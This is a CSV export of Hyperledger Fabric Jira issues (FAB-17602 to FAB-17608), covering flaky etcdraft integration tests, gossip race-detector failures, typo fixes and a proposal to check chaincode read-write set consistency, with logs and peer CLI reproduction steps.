/cc [~caod]",,denyeart,sykesm,wenjian,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17612,,,,,,,,,,,,,,,"11/Mar/20 2:38 AM;sykesm;fail.log;https://jira.hyperledger.org/secure/attachment/18162/fail.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ie",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,sykesm,wenjian,wlahti,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Mar/20 6:20 AM;denyeart;Another occurrence - see the dup.;;;","23/Mar/20 11:37 PM;wlahti;Hit again today: https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=10397&view=logs&jobId=8256cc8e-6958-5298-9192-a56310d8944e&j=8256cc8e-6958-5298-9192-a56310d8944e&t=8f10a5b7-d5b0-53b0-8da3-65557ddcce3d;;;","24/Mar/20 4:50 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/898;;;","24/Mar/20 11:21 PM;denyeart;And remove dup tests for old lifecycle: https://github.com/hyperledger/fabric/pull/904;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in etcdraft config test,FAB-17602,44534,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,caod,caod,11/Mar/20 4:32 AM,19/Mar/20 7:04 AM,28/Oct/23 3:09 AM,19/Mar/20 7:04 AM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"EndToEnd reconfiguration and onboarding [0m[0mwhen a single node cluster is expanded [0m[91m[1m[It] is still possible to onboard the new cluster member and then another one with a different TLS root CA

{code:java}
2020-03-10T19:14:30.1907562Z Waiting for: 2020-03-10T19:14:30.1907894Z Raft leader changed: 1 -> 0[0m 2020-03-10T19:14:30.1908032Z 2020-03-10T19:14:30.1908270Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/raft/config_test.go:404 2020-03-10T19:14:30.1908655Z [90m------------------------------[0m 2020-03-10T19:19:11.5218037Z [32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m 2020-03-10T19:19:11.5218505Z 2020-03-10T19:19:11.5218864Z [91m[1mSummarizing 1 Failure:[0m 2020-03-10T19:19:11.5219182Z 2020-03-10T19:19:11.5219865Z [91m[1m[Fail] [0m[90mEndToEnd reconfiguration and onboarding [0m[0mwhen a single node cluster is expanded [0m[91m[1m[It] is still possible to onboard the new cluster member and then another one with a different TLS root CA [0m 2020-03-10T19:19:11.5221030Z [37m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/raft/config_test.go:404[0m 2020-03-10T19:19:11.5221295Z 2020-03-10T19:19:11.5221614Z [1m[91mRan 22 of 22 Specs in 490.607 seconds[0m 2020-03-10T19:19:11.5222147Z [1m[91mFAIL![0m -- [32m[1m21 Passed[0m | [91m[1m1 Failed[0m | [33m[1m0 Pending[0m | [36m[1m0 Skipped[0m 2020-03-10T19:19:11.5222720Z --- FAIL: TestRaft (490.61s) 2020-03-10T19:19:11.5222879Z FAIL 2020-03-10T19:20:19.2741244Z [1583867393] [1mGossip Communication Suite[0m - 1/1 specs 2020-03-10T19:20:19.2742722Z [90m------------------------------[0m 2020-03-10T19:20:19.2743414Z [32mâ€¢ [SLOW TEST:67.698 seconds][0m 2020-03-10T19:20:19.2744321Z [90mGossip Test [0m[0mGossip state transfer test [0m[90msyncs blocks from the peer if no orderer is available, using solo network with 2 orgs, 2 peers each [0m 2020-03-10T19:20:19.2745589Z [37m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/gossip/gossip_test.go:113[0m 2020-03-10T19:20:19.2746840Z [90m------------------------------[0m 2020-03-10T19:20:19.2878544Z [32mSUCCESS![0m 1m7.740558427s PASS 2020-03-10T19:20:21.4017246Z [1583867393] [1mIntegration Suite[0m - 3/3 specs [32mâ€¢[0m[32mâ€¢[0m[32mâ€¢[0m [32mSUCCESS![0m 2.107447432s PASS 2020-03-10T19:20:21.4054801Z 2020-03-10T19:20:21.4055167Z There were failures detected in the following suites: 2020-03-10T19:20:21.4055757Z [91mraft[0m [37m./integration/raft[0m 2020-03-10T19:20:21.4119901Z 2020-03-10T19:20:21.4126037Z Ginkgo ran 3 suites in 10m28.264006913s 2020-03-10T19:20:21.4147503Z Test Suite Failed 2020-03-10T19:20:21.4148438Z Makefile:138: recipe for target 'integration-test' failed 2020-03-10T19:20:21.4149183Z make: *** [integration-test] Error 1 2020-03-10T19:20:21.4154895Z 2020-03-10T19:20:21.4236677Z ##[error]Bash exited with code '2'. 2020-03-10T19:20:21.4250787Z ##[section]Finishing: Run Integration Tests
{code}",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17343,,,,,,,,,,,,,"11/Mar/20 4:32 AM;caod;etcdraft_it_flake_03-10-20.txt;https://jira.hyperledger.org/secure/attachment/18163/etcdraft_it_flake_03-10-20.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019uz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support consensus type state field in config value,FAB-17603,44538,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,12/Mar/20 12:23 AM,18/Mar/20 10:02 AM,28/Oct/23 3:09 AM,18/Mar/20 2:46 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,ob.ConsensusType actually supports an additional State field that we currently aren't setting. Lets go ahead and add that to the standardConfigValue for ConsensusType,,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzyhc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 10:39 PM;tsharris;[https://github.com/hyperledger/fabric/pull/873];;;","18/Mar/20 2:46 AM;tsharris;[https://github.com/hyperledger/fabric/pull/874];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Maybe we should check the RwSets consistency of the chaincode package,FAB-17604,44541,,Task,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,KevinXiong1977,KevinXiong1977,12/Mar/20 10:09 AM,24/Nov/20 8:32 AM,28/Oct/23 3:09 AM,24/Nov/20 8:32 AM,v2.0.0,v2.1.0,,,,,,,,v2.1.0,,,,fabric-peer,,,,,,,,,0,chaincode,,,,,"In Fabric 2.0, different versions of the chaincode package are allowed to be deployed on different peer nodes, including different chaincode development languages.

But if the packages installed on different nodes have inconsistent read and write sets, when chaincode invoke, ProposalResponsePayloads do not match.

Maybe we should check the RwSets consistency of the chaincode package,  E.g:

peer lifecycle chaincode {color:#ff0000}*checkpackagereadiness*{color} mycc1.tar.gz mycc2.tar.gz

Chaincode commit can add an option --checkpackage, the default value is false. If set to true, commit is not allowed when not passed

peer lifecycle chaincode {color:#de350b}*commit --checkpackage true*{color} ........

---------------------------------------------

The following is the test process of ProposalResponsePayloads do not match:

{color:#172b4d}*Org1MSP*{color}

peer lifecycle chaincode package abstore1_go.tar.gz --path /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go --lang golang --label abstore1

peer lifecycle chaincode install abstore1_go.tar.gz

peer lifecycle chaincode approveformyorg --channelID mychannel --name mycc --version 1.0 --signature-policy ""AND('Org1MSP.member','Org2MSP.member')"" --init-required --package-id abstore1:1e56a9b84ce52e75991b2ed9c8f61ec0f87e5a5f41737b4acf6a303eca4fee2c --sequence 1 --tls true --cafile $ORDERER_CA

{color:#172b4d}*Org2MSP*{color}

vim /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go/abstore.go

func (t *ABstore) invoke(stub shim.ChaincodeStubInterface, args []string) pb.Response

............

*Aval = Aval - X  - X*
 *Bval = Bval + X + X*

peer lifecycle chaincode package abstore1_go.tar.gz --path /root/go/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go --lang golang --label abstore1

peer lifecycle chaincode install abstore1_go.tar.gz

*peer lifecycle chaincode approveformyorg* --channelID mychannel --name mycc --version 1.0 --signature-policy ""AND('Org1MSP.member','Org2MSP.member')"" --init-required --package-id abstore1:1e56a9b84ce52e75991b2ed9c8f61ec0f87e5a5f41737b4acf6a303eca4fee2c --sequence 1 --tls true --cafile $ORDERER_CA

*peer lifecycle chaincode commit* -o orderer1.example.com:7050 --channelID mychannel --name mycc --version 1.0 --sequence 1 --signature-policy ""AND('Org1MSP.member','Org2MSP.member')"" --init-required --tls true --cafile $ORDERER_CA --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA

*peer chaincode invoke* -o orderer1.example.com:7050 --isInit --tls true --cafile $ORDERER_CA -C mychannel -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA  --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA -c '{""Args"":[""Init"",""a"",""1000"",""b"",""1000""]}' --waitForEvent

peer chaincode query -C mychannel -n mycc -c '\{""Args"":[""query"",""a""]}'

1000

peer chaincode query -C mychannel -n mycc -c '\{""Args"":[""query"",""b""]}'

1000

*peer chaincode invoke* -o orderer1.example.com:7050 --tls true --cafile $ORDERER_CA -C mychannel -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles $ORG1_CA --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles $ORG2_CA -c '\{""Args"":[""invoke"",""a"",""b"",""100""]}' --waitForEvent

{color:#ff0000}Error: could not assemble transaction: ProposalResponsePayloads do not match - proposal response: version:1 response:<status:200 > payload:""{color}

 ",,KevinXiong1977,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019vn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),KevinXiong1977,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Mar/20 7:20 PM;yacovm;The read-write sets are produced at runtime.... you can't really do anything unless you do some sort of code analysis and it's just not worth it.

 ;;;","24/Nov/20 8:32 AM;manish-sethi;Not in the scope of Fabric peer. [~KevinXiong1977] if you want to propose a static code analysis based approach, that's a much bigger effort and orthogonal effort and [hyperledger lab|https://www.hyperledger.org/blog/2018/01/23/introducing-hyperledger-labs] is a forum for incubating such stuff. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unhandled InitFactories error,FAB-17605,44545,,Bug,In CR Review,FAB,Fabric,software,denyeart,,,Low,,Eggsy,Eggsy,Eggsy,12/Mar/20 8:15 PM,19/Apr/20 12:38 AM,28/Oct/23 3:09 AM,,v1.4.6,,,,,,,,,,,,,fabric-crypto,,,,,,,,,0,,,,,,"A project using func InitFactories, it output errors when build it. But many places do not handle errors.
{code:java}
//代码占位符
factory.InitFactories(nil)
func InitFactories(config *FactoryOpts) error {
}{code}",,denyeart,Eggsy,MHBauer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019wb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,Eggsy,MHBauer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 1:02 PM;denyeart;https://github.com/hyperledger/fabric/pull/919;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix the wrong word ,FAB-17606,44546,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,Eggsy,Eggsy,Eggsy,12/Mar/20 10:26 PM,13/Mar/20 9:13 PM,28/Oct/23 3:09 AM,13/Mar/20 9:13 PM,v1.4.0,v1.4.1,v1.4.2,v1.4.3,v1.4.4,v1.4.5,v1.4.6,v2.0.0,v2.0.1,,,,,,,,,,,,,,0,,,,,,"Fix the wrong word.  Suported ---> Supported
{code:java}
// code placeholder
func TestNotSuported(t *testing.T) {
   op := NewOrdererProvider(map[string]*cb.Capability{
      OrdererV1_1: {}, ""Bogus_Not_suported"": {},
   })
   assert.EqualError(t, op.Supported(), ""Orderer capability Bogus_Not_suported is required but not supported"")
}
{code}",,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019wj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix some wrong word,FAB-17607,44548,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,Eggsy,Eggsy,Eggsy,12/Mar/20 10:50 PM,13/Mar/20 9:13 PM,28/Oct/23 3:09 AM,13/Mar/20 9:13 PM,v1.4.6,,,,,,,,,,,,,,,,,,,,,,0,,,,,," 
||old||now||
|atrributes|attributes|
|selectvely|selectively|
|diclosing|*[disclosing|https://www.baidu.com/s?wd=disclosing&f=12&rsp=0&oq=diclosing&ie=utf-8&usm=1&rsv_idx=1&rsv_pq=a21b635e003e62b6&rsv_t=5ad2mSX88oJzbj%2BNUranLJbgGPQ8R3cHfyNyRV%2BMzF%2FslG1%2F7jsMdEGGft4&rqlang=cn]* |

 ",,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019wz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Gossip tests failing with the race detector enabled,FAB-17608,44550,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,sykesm,sykesm,13/Mar/20 2:17 AM,07/Apr/20 6:53 AM,28/Oct/23 3:09 AM,07/Apr/20 6:53 AM,v2.0.1,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,race,,,,,"{{go test -count 1 -race ./gossip/...}}

{code}
==================
WARNING: DATA RACE
Read at 0x00c000032bd0 by goroutine 54:
  runtime.mapaccess2_faststr()
      /usr/local/go/src/runtime/map_faststr.go:107 +0x0
  github.com/hyperledger/fabric/gossip/gossip.(*naiveCryptoService).Expiration()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:123 +0x10b
  github.com/hyperledger/fabric/gossip/identity.(*identityMapperImpl).Put()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/identity/identity.go:113 +0xcf
  github.com/hyperledger/fabric/gossip/identity.NewIdentityMapper()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/identity/identity.go:82 +0x2f7
  github.com/hyperledger/fabric/gossip/gossip.New()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_impl.go:97 +0x837
  github.com/hyperledger/fabric/gossip/gossip.newGossipInstanceWithGrpcMcsMetrics()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:250 +0x892
  github.com/hyperledger/fabric/gossip/gossip.newGossipInstanceCreateGRPCWithMCSWithMetrics()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:318 +0xc6
  github.com/hyperledger/fabric/gossip/gossip.newGossipInstanceCreateGRPC()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:324 +0xfa
  github.com/hyperledger/fabric/gossip/gossip.TestNoMessagesSelfLoop()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:653 +0x23e
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Previous write at 0x00c000032bd0 by goroutine 61:
  runtime.mapassign_faststr()
      /usr/local/go/src/runtime/map_faststr.go:202 +0x0
  github.com/hyperledger/fabric/gossip/gossip.TestIdentityExpiration()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:1419 +0x4a1
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Goroutine 54 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1043 +0x660
  testing.runTests.func1()
      /usr/local/go/src/testing/testing.go:1285 +0xa6
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb
  testing.runTests()
      /usr/local/go/src/testing/testing.go:1283 +0x527
  testing.(*M).Run()
      /usr/local/go/src/testing/testing.go:1200 +0x2ff
  github.com/hyperledger/fabric/gossip/gossip.TestMain()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:46 +0xc0
  main.main()
      _testmain.go:100 +0x223

Goroutine 61 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1043 +0x660
  testing.runTests.func1()
      /usr/local/go/src/testing/testing.go:1285 +0xa6
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb
  testing.runTests()
      /usr/local/go/src/testing/testing.go:1283 +0x527
  testing.(*M).Run()
      /usr/local/go/src/testing/testing.go:1200 +0x2ff
  github.com/hyperledger/fabric/gossip/gossip.TestMain()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:46 +0xc0
  main.main()
      _testmain.go:100 +0x223
==================
--- FAIL: TestLeaveChannel (2.12s)
    testing.go:906: race detected during execution of test



==================
WARNING: DATA RACE
Write at 0x000001bc0a90 by goroutine 43:
  github.com/hyperledger/fabric/gossip/state.TestHaltChainProcessing.func4()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:771 +0x3a
  github.com/hyperledger/fabric/gossip/state.TestHaltChainProcessing()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:796 +0x1132
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Previous read at 0x000001bc0a90 by goroutine 48:
  github.com/hyperledger/fabric/gossip/state.(*GossipStateProviderImpl).antiEntropy()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:591 +0xa2

Goroutine 43 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1043 +0x660
  testing.runTests.func1()
      /usr/local/go/src/testing/testing.go:1285 +0xa6
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb
  testing.runTests()
      /usr/local/go/src/testing/testing.go:1283 +0x527
  testing.(*M).Run()
      /usr/local/go/src/testing/testing.go:1200 +0x2ff
  main.main()
      _testmain.go:92 +0x223

Goroutine 48 (running) created at:
  github.com/hyperledger/fabric/gossip/state.NewGossipStateProvider()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:275 +0xe5e
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossipWithValidatorWithMetrics()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:418 +0xa41
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossipWithValidator()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:447 +0xea
  github.com/hyperledger/fabric/gossip/state.TestHaltChainProcessing()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:789 +0xd27
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb
==================
--- FAIL: TestHaltChainProcessing (1.01s)

RNING: DATA RACE
Read at 0x00c00019c040 by goroutine 172:
  github.com/hyperledger/fabric/gossip/state.(*mockCommitter).DoesPvtDataInfoExistInLedger()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:228 +0xb5
  github.com/hyperledger/fabric/gossip/privdata.(*coordinator).StoreBlock()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/privdata/coordinator.go:175 +0x6d1
  github.com/hyperledger/fabric/gossip/state.(*GossipStateProviderImpl).commitBlock()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:785 +0xcc
  github.com/hyperledger/fabric/gossip/state.(*GossipStateProviderImpl).deliverPayloads()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:575 +0x7f7

Previous write at 0x00c00019c040 by goroutine 42:
  github.com/hyperledger/fabric/gossip/state.TestBlockingEnqueue()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:719 +0xf64
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Goroutine 172 (running) created at:
  github.com/hyperledger/fabric/gossip/state.NewGossipStateProvider()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:272 +0xdaa
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossipWithValidatorWithMetrics()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:418 +0xa41
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossipWithValidator()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:447 +0xea
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossip()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:336 +0xa15
  github.com/hyperledger/fabric/gossip/state.newPeerNode()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:453 +0x955
  github.com/hyperledger/fabric/gossip/state.TestBlockingEnqueue()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:674 +0x936
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Goroutine 42 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1043 +0x660
  testing.runTests.func1()
      /usr/local/go/src/testing/testing.go:1285 +0xa6
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb
  testing.runTests()
      /usr/local/go/src/testing/testing.go:1283 +0x527
  testing.(*M).Run()
      /usr/local/go/src/testing/testing.go:1200 +0x2ff
  main.main()
      _testmain.go:92 +0x223
==================
==================
WARNING: DATA RACE
Write at 0x00c0001e8368 by goroutine 172:
  sync/atomic.CompareAndSwapInt32()
      /usr/local/go/src/runtime/race_amd64.s:293 +0xb
  sync.(*Mutex).Lock()
      /usr/local/go/src/sync/mutex.go:74 +0x49
  github.com/hyperledger/fabric/vendor/github.com/stretchr/testify/mock.(*Mock).MethodCalled()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/github.com/stretchr/testify/mock/mock.go:342 +0x61
  github.com/hyperledger/fabric/vendor/github.com/stretchr/testify/mock.(*Mock).Called()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/github.com/stretchr/testify/mock/mock.go:334 +0x1e4
  github.com/hyperledger/fabric/gossip/state.(*mockCommitter).DoesPvtDataInfoExistInLedger()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:228 +0xe5
  github.com/hyperledger/fabric/gossip/privdata.(*coordinator).StoreBlock()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/privdata/coordinator.go:175 +0x6d1
  github.com/hyperledger/fabric/gossip/state.(*GossipStateProviderImpl).commitBlock()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:785 +0xcc
  github.com/hyperledger/fabric/gossip/state.(*GossipStateProviderImpl).deliverPayloads()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:575 +0x7f7

Previous write at 0x00c0001e8368 by goroutine 42:
  github.com/hyperledger/fabric/gossip/state.TestBlockingEnqueue()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:712 +0xb31
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Goroutine 172 (running) created at:
  github.com/hyperledger/fabric/gossip/state.NewGossipStateProvider()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state.go:272 +0xdaa
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossipWithValidatorWithMetrics()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:418 +0xa41
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossipWithValidator()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:447 +0xea
  github.com/hyperledger/fabric/gossip/state.newPeerNodeWithGossip()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:336 +0xa15
  github.com/hyperledger/fabric/gossip/state.newPeerNode()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:453 +0x955
  github.com/hyperledger/fabric/gossip/state.TestBlockingEnqueue()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/state/state_test.go:674 +0x936
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb

Goroutine 42 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1043 +0x660
  testing.runTests.func1()
      /usr/local/go/src/testing/testing.go:1285 +0xa6
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:992 +0x1eb
  testing.runTests()
      /usr/local/go/src/testing/testing.go:1283 +0x527
  testing.(*M).Run()
      /usr/local/go/src/testing/testing.go:1200 +0x2ff
  main.main()
      _testmain.go:92 +0x223
==================
--- FAIL: TestOverPopulation (0.16s)
    testing.go:906: race detected during execution of test
{code}",,MHBauer,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15451,,,,,,,,,,,,,,,"06/Apr/20 10:17 PM;sykesm;screenshot-1.png;https://jira.hyperledger.org/secure/attachment/18207/screenshot-1.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019xf:",,,,Unset,Unset,,"go test -count 1 -race ./gossip/...

